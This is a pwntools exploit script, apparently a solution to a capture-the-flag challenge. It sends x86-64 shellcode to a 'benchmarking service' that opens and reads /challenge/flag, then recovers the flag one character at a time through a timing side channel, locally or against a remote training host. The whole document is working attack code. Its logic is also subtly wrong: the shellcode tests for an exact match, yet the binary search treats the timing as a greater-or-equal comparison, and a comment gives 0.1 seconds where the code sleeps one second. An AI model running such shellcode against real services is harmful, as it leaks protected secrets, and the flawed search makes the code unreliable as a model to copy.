import os
import subprocess
import string
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def utf8len(s):
    return len(s.encode('utf-8'))

def create_timing_shellcode(position, character):
    shellcode = asm(f'''
        /* Open /challenge/flag */
        mov rax, 0x0067616c662f6567
        push rax
        mov rax, 0x6e656c6c6168632f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x2
        syscall
        
        /* Read flag into stack */
        mov rdi, rax
        sub rsp, 0x100
        mov rsi, rsp
        mov rdx, 0x100
        xor rax, rax
        syscall
        
        /* Check character at position {position} */
        cmp byte ptr [rsi + {position}], {character}
        jne skip
        
        /* If match, nanosleep for 0.1 seconds */
        push    0
        push    1
        mov     rdi, rsp
        xor     rsi, rsi
        mov     rax, 35
        syscall
        add rsp, 16
        
    skip:
        xor rdi, rdi
        mov rax, 60
        syscall
    ''')
    
    return shellcode.ljust(1024, b'\x90')

def binary_search_char(position, charset):
    low, high = 0, len(charset) - 1
    
    while low <= high:
        mid = (low + high) // 2
        char = charset[mid]
        
        try:
            if args.REMOTE:
                p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
            else:
                p = process(['python3', 'wrapper.py'], env={'PYTHONUNBUFFERED': '1'})

            shellcode = create_timing_shellcode(position, ord(char))

            p.recv(utf8len("======= BENCHMARKING SERVICE V1.0 =======\n"))
            p.recv(utf8len("Shellcode: "))
            p.send(shellcode)
            time_str = p.recvall().decode("utf-8").split("Time: ")[1].strip()
            time_val = float(time_str)
            p.close()

            log.info(f"Testing char '{char}' (ASCII {ord(char)}): {time_val:.3f}s")
            
            if time_val > 1.0:
                # Character is greater than or equal to target
                high = mid - 1
            else:
                # Character is less than target  
                low = mid + 1
                
        except Exception as e:
            log.warning(f"Error with '{char}': {e}")
            try:
                p.close()
            except:
                pass
            continue
    
    # The correct character should be at low index
    if low < len(charset):
        return charset[low]
    return None

def brute_force_flag_binary():
    flag = ""
    position = 0
    # Use sorted character set for binary search
    charset = ''.join(sorted(string.printable))
    
    while True:
        log.info(f"Position {position}, current flag: {flag}")
        
        char = binary_search_char(position, charset)
        
        if char is None:
            log.warning(f"No character found for position {position}")
            break
            
        flag += char
        log.success(f"Found character '{char}' -> {flag}")
        position += 1
        
        if flag.endswith('}'):
            log.success(f"Complete flag: {flag}")
            break
            
    return flag

# Run the binary search version
brute_force_flag_binary()